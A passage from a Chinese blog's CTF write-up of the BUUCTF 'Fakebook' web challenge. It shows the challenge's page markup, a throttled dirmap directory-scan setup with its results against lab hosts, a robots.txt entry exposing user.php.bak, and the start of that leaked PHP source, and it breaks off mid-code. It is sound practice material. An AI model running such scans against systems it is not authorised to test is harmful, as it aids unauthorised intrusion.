<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>CTF之Web习题--032--BUU练习题 | 矢幽武博客</title><meta name="author" content="矢幽武"><meta name="copyright" content="矢幽武"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="是时候翻篇啦~ BUUCTF刷题区第二页： [网鼎杯 2018]Fakebook原始信息Fakebook：虚构乐谱 index.php &lt;h1&gt;the Fakebook&lt;&#x2F;h1&gt;&lt;div class&#x3D;&amp;#x27;row&amp;#x27;&gt;   &lt;div class&#x3D;&amp;#x27;col-md-2&amp;#x27;&gt;&lt;a href&#x3D;&amp;#x27;login.ph">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF之Web习题--032--BUU练习题">
<meta property="og:url" content="http://example.com/2023/08/14/CTF-web-032/index.html">
<meta property="og:site_name" content="矢幽武博客">
<meta property="og:description" content="是时候翻篇啦~ BUUCTF刷题区第二页： [网鼎杯 2018]Fakebook原始信息Fakebook：虚构乐谱 index.php &lt;h1&gt;the Fakebook&lt;&#x2F;h1&gt;&lt;div class&#x3D;&amp;#x27;row&amp;#x27;&gt;   &lt;div class&#x3D;&amp;#x27;col-md-2&amp;#x27;&gt;&lt;a href&#x3D;&amp;#x27;login.ph">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/backgroude/b35.jpg">
<meta property="article:published_time" content="2023-08-14T00:19:08.000Z">
<meta property="article:modified_time" content="2023-10-09T13:37:18.608Z">
<meta property="article:author" content="矢幽武">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="buuctf">
<meta property="article:tag" content="web">
<meta property="article:tag" content="汇总型-web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/backgroude/b35.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2023/08/14/CTF-web-032/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF之Web习题--032--BUU练习题',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-09 21:37:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">200</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">30</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroude/b35.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="矢幽武博客"><span class="site-name">矢幽武博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF之Web习题--032--BUU练习题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-14T00:19:08.000Z" title="发表于 2023-08-14 08:19:08">2023-08-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-09T13:37:18.608Z" title="更新于 2023-10-09 21:37:18">2023-10-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">42.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>212分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF之Web习题--032--BUU练习题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>是时候翻篇啦~</p>
<p>BUUCTF刷题区第二页：</p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><h2 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h2><p>Fakebook：虚构乐谱</p>
<p>index.php</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>the Fakebook<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;row&#x27;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;col-md-2&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;login.php&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-success&#x27;</span>&gt;</span>login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;col-md-2&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;join.php&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;btn btn-info&#x27;</span>&gt;</span>join<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Share your stories with friends, family and friends from all over the world on <span class="tag">&lt;<span class="name">code</span>&gt;</span>Fakebook<span class="tag">&lt;/<span class="name">code</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>username<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>age<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>join.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;join.ok.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">   &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-1&quot;&gt;</span></span><br><span class="line"><span class="class">         <span class="title">username</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">maxlength</span>=&quot;100&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-1&quot;&gt;</span></span><br><span class="line"><span class="class">         <span class="title">passwd</span> :</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">passwd</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-1&quot;&gt;</span></span><br><span class="line"><span class="class">         <span class="title">age</span> :</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">age</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-1&quot;&gt;</span></span><br><span class="line"><span class="class">         <span class="title">blog</span> :</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">blog</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">join</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;login page&lt;/h1&gt;</span><br><span class="line">&lt;form action=login.ok.php method=post <span class="class"><span class="keyword">class</span>=<span class="title">form</span>-<span class="title">group</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">row</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">col</span>-<span class="title">md</span>-1&gt;</span></span><br><span class="line"><span class="class">         <span class="title">username</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">col</span>-<span class="title">md</span>-4&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">text</span> <span class="title">name</span>=<span class="title">username</span> <span class="title">class</span>=<span class="title">form</span>-<span class="title">control</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">row</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">col</span>-<span class="title">md</span>-1&gt;</span></span><br><span class="line"><span class="class">         <span class="title">passwd</span></span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">col</span>-<span class="title">md</span>-4&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">password</span> <span class="title">name</span>=<span class="title">passwd</span> <span class="title">class</span>=<span class="title">form</span>-<span class="title">control</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;<span class="title">div</span> <span class="title">class</span>=<span class="title">row</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">input</span> <span class="title">type</span>=<span class="title">submit</span> <span class="title">value</span>=<span class="title">login</span> <span class="title">class</span>=<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span>&gt;</span></span><br><span class="line"><span class="class">   &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="收集信息，找突破口"><a href="#收集信息，找突破口" class="headerlink" title="收集信息，找突破口"></a>收集信息，找突破口</h3><p>直接dirmap漏扫是存在很大弊端的，原因很明显，请求数据过多不就无法请求了？<br>这里需要配置下<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsw15841822890/article/details/107555288">dirmap</a><br>主要是不能让它把测试地址测爆了……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编辑dirmap下的dirmap.conf</span></span><br><span class="line"><span class="comment">#自定义每个请求超时时间。默认配置3秒。</span></span><br><span class="line">conf.request_timeout = <span class="number">3</span></span><br><span class="line"><span class="comment">#随机延迟(0-x)秒发送请求。参数必须是整数。默认配置0秒，无延迟。</span></span><br><span class="line">conf.request_delay = <span class="number">2</span></span><br><span class="line"><span class="comment">#自定义单个目标，请求协程线程数。默认配置30线程</span></span><br><span class="line">conf.request_limit = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>虽然缓慢，但挖掘出一堆信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">0</span>b] http:<span class="comment">//848a66a8-7bd6-483e-bca4-a9c5dab34f90.node4.buuoj.cn:81/flag.php</span></span><br><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">1.31</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/login.php</span></span><br><span class="line">[<span class="number">200</span>][text/plain][<span class="number">37.00</span>b] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/robots.txt</span></span><br><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">0</span>b] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/user.php</span></span><br><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">1019.00</span>b] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/view.php</span></span><br><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">1.31</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/login.php</span></span><br><span class="line">[<span class="number">200</span>][application/javascript][<span class="number">19.86</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/js/popper.min.js</span></span><br><span class="line">[<span class="number">200</span>][text/css][<span class="number">137.63</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/css/bootstrap.min.css</span></span><br><span class="line">[<span class="number">200</span>][text/html; charset=UTF-<span class="number">8</span>][<span class="number">2.03</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/join.php</span></span><br><span class="line">[<span class="number">200</span>][application/javascript][<span class="number">49.84</span>kb] http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/js/bootstrap.min.js</span></span><br><span class="line"><span class="number">100</span>% (<span class="number">6035</span> of <span class="number">6035</span>) |<span class="comment">############################################################| Elapsed Time: 0:11:49 Time:  0:11:49</span></span><br><span class="line"></span><br><span class="line">就等于告诉你：</span><br><span class="line">login.php  robots.txt user.php view.php login.php join.php flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试访问其中一个查看信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">访问：http:<span class="comment">//3647d6c4-affe-4956-9577-e7d14dfea208.node4.buuoj.cn:81/robots.txt</span></span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>

<p>user.php.bak，很显然是一个类似于源码的东西。打开如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="comment"># 用户名,年龄,你的博客地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//  预定义的魔术方法，接受变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span 